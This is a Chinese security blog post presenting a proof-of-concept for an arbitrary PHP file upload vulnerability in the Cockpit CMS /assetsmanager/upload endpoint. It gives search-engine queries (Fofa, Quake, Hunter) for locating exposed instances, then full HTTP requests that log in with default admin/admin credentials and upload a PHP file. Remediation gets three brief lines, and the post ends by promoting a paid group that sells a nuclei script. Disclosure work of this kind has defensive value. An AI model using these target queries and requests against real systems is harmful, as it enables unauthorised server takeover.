#  【漏洞复现】cockpit系统assetsmanager/upload接口存在文件上传漏洞 | 附poc   
原创 xiaocaiji  网安鲲为帝   2024-05-19 21:30  
  
**0x00****免责声明**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
本  
文  
仅  
用  
于  
技  
术  
讨  
论  
与  
学  
习  
，  
利  
用  
此  
文  
所  
提  
供  
的  
信  
息  
而  
造  
成  
的  
任  
何  
直  
接  
或  
者  
间  
接  
的  
后  
果  
及  
损  
失  
，  
均  
由  
使  
用  
者  
本  
人  
负  
责  
，  
文  
章  
作  
者  
及  
本  
公  
众  
号  
团  
队  
不  
为  
此  
承  
担  
任  
何  
责  
任  
。  
  
  
**0x01 漏洞描述**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
cockpit系统assetsmanager/upload接口处存在任意文件上传漏洞。攻击者可通过该漏洞在服务端任意上传代码并获取服务器权限，进而控制整个Web服务器。  
  
  
**0x02 空间测绘**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
测  
绘  
语  
法：  
```
Fofa：title="Authenticate Please!"
quake：title:"Authenticate Please!"
hunter：web.title="Authenticate Please!"
```  
  
  
****  
**0x03 漏洞复现**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
登录界面如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlHHlBQeVY6UDk7v1mpOjX72IrKBgBB6iat4ZuU0uLDYQj5zfQJsSanpjA/640?wx_fmt=other&from=appmsg "")  
  
1.执行poc进行csrf信息获取，并获取cookie，再上传访问得到结果：  
```
GET /auth/login?to=/ HTTP/1.1
Host: xxx.com
Content-Length: 2
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlH4tibg6LSibCBDDJuWYfyD4Ta6lp8obWZTibTE0nIia2JZVV7M35CljjKlQ/640?wx_fmt=png&from=appmsg "")  
  
  
2.使用刚才上一步获取到的jwt获  
取cookie：  
```
POST /auth/check HTTP/1.1
Host: xxx.com
Content-Type: application/json
User-Agent: Mozilla/5.0 
Content-Length: 157

{"auth":{"user":"admin","password":"admin"},"csfr":"csfr"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlHs8lQfu48NnIR9lmuiap55R5GXZ1CzwxyEX0SDCSaGad4VG15yTUnicRA/640?wx_fmt=png&from=appmsg "")  
  
3.上传文件：  
  
```
POST /assetsmanager/upload HTTP/1.1
Host: xxx.com
Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
Cookie: mysession=123451234512345123451234512345123
User-Agent: Mozilla/5.0 
Content-Length: 357

-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="files[]"; filename="BE1a3e.php"
Content-Type: text/php

<?php echo "12131231231234e80test";unlink(__FILE__);?>
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="folder"


-----------------------------36D28FBc36bd6feE7Fb3--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlHrq5gKAlFEARE11ZqX1fn8Zrib75UxyNIntZDic0r6S5HHVR0kAhGNfBA/640?wx_fmt=png&from=appmsg "")  
  
4.访问   
url+/storage/uploads/+path 验证上传结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlHhoNr1ySCkZkyiaYCTuQua4oqFx0iaZsw27PZiaaL2tdMVbdxLxCCKna3g/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x04 修复意见**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
1、请联系厂商进行修复。   
  
2、在后端限制允许上传的文件类型或文件内容。   
  
3、设置白名单访问。  
  
  
**0x05 nuclei验证脚本获取**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
验证脚本已发布到纷传圈子，目前还有几个优惠进入名额，师傅们要进的抓紧哦！后续价格只增不减，错过机会难再遇哦！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEK6WOO3Fu76yXWSltpsYPlHYewSwbIscED0zEWkGvCah2V3JZN6KHXicLCnvV97SCJxcicsYJNDeSoQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
**0x06 欢迎进群交流**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
添加微信进群：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJdfiaGbzW6sp0kFvhYC7ejuJuS6lWyHyUGg40F2QVic6goic34EbYceQ2WE4eyMZ8oxbswQkhzJLhNQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
